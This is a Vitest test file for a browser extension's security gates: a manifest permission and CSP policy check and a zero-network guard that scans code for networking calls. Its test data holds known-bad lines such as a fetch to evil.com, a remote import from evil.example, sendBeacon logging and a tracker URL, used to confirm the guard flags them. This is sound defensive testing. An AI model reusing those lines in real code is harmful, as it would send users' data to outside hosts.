/**
 * Self-test for the two load-bearing security controls:
 *   - `assertManifestPolicy` (src/manifest.config.ts), the typed permission +
 *     CSP gate the Vite build calls; and
 *   - the standalone zero-network guard's `scanText` / `checkManifestObject`
 *     (scripts/no-network-guard.mjs), the CI gate that scans src + dist.
 *
 * Without this test a broken regex or allowlist would let the guard exit 0 on
 * genuinely-bad input while CI stays green. Here we prove each control FAILS on
 * known-bad input and PASSES on the real, shipped manifest.
 */
import { describe, expect, it } from 'vitest';
import {
  assertManifestPolicy,
  manifest,
  EXTENSION_PAGES_CSP,
} from '../src/manifest.config';
// @ts-expect-error — plain .mjs guard script, no type declarations by design.
import { scanText, checkManifestObject } from '../scripts/no-network-guard.mjs';

const OK_CSP = { extension_pages: EXTENSION_PAGES_CSP };

describe('assertManifestPolicy', () => {
  it('accepts the real shipped manifest', () => {
    expect(() =>
      assertManifestPolicy(manifest as unknown as Record<string, unknown>),
    ).not.toThrow();
  });

  it('rejects each forbidden top-level key', () => {
    for (const key of [
      'host_permissions',
      'content_scripts',
      'externally_connectable',
      'optional_permissions',
    ]) {
      expect(() =>
        assertManifestPolicy({
          permissions: ['tabs'],
          content_security_policy: OK_CSP,
          [key]: [],
        }),
      ).toThrow(/forbidden top-level key/);
    }
  });

  it('rejects an off-allowlist permission (e.g. cookies)', () => {
    expect(() =>
      assertManifestPolicy({
        permissions: ['tabs', 'cookies'],
        content_security_policy: OK_CSP,
      }),
    ).toThrow(/cookies|allowlist/);
  });

  it('rejects a forbidden permission (e.g. <all_urls>)', () => {
    expect(() =>
      assertManifestPolicy({
        permissions: ['<all_urls>'],
        content_security_policy: OK_CSP,
      }),
    ).toThrow();
  });

  it('rejects a missing / egress-allowing CSP', () => {
    // No CSP at all.
    expect(() => assertManifestPolicy({ permissions: ['tabs'] })).toThrow(
      /content_security_policy/,
    );
    // CSP present but does not block connect-src.
    expect(() =>
      assertManifestPolicy({
        permissions: ['tabs'],
        content_security_policy: { extension_pages: "script-src 'self'" },
      }),
    ).toThrow(/connect-src/);
  });
});

describe('no-network-guard scanText', () => {
  it('flags every networking primitive on known-bad input', () => {
    const cases: Array<[string, string]> = [
      ['const x = fetch("https://evil.com")', 'fetch('],
      ['new XMLHttpRequest()', 'XMLHttpRequest'],
      ['const s = new WebSocket("wss://x")', 'WebSocket'],
      ['new EventSource("/x")', 'EventSource'],
      ['const p = new RTCPeerConnection()', 'RTCPeerConnection'],
      ['new webkitRTCPeerConnection()', 'webkitRTCPeerConnection'],
      ['const w = new SharedWorker("x.js")', 'SharedWorker'],
      ['navigator.sendBeacon("/log", data)', 'navigator.sendBeacon('],
      ["import evil from 'https://evil.example/x.js'", 'remote ESM import'],
      ['const u = "https://tracker.example/pixel"', 'remote URL literal'],
    ];
    for (const [line, label] of cases) {
      const labels = scanText(line).map((f: { label: string }) => f.label);
      expect(labels, `expected "${line}" to be flagged`).toContain(label);
    }
  });

  it('does NOT flag clean local code or the benign w3.org namespace URIs', () => {
    const clean = [
      'const el = document.createElementNS("http://www.w3.org/2000/svg", "svg");',
      'chrome.tabs.create({ url });',
      'await storage.putTabs(tabs);',
      "const n = 'http://www.w3.org/1999/xhtml';",
    ].join('\n');
    expect(scanText(clean)).toEqual([]);
  });
});

describe('no-network-guard checkManifestObject', () => {
  it('passes the shipped manifest and fails bad manifests', () => {
    expect(checkManifestObject(manifest)).toEqual([]);
    expect(
      checkManifestObject({
        permissions: ['tabs', 'cookies'],
        content_security_policy: OK_CSP,
      }).length,
    ).toBeGreaterThan(0);
    expect(
      checkManifestObject({ permissions: ['tabs'] }).length,
    ).toBeGreaterThan(0); // missing CSP
  });
});
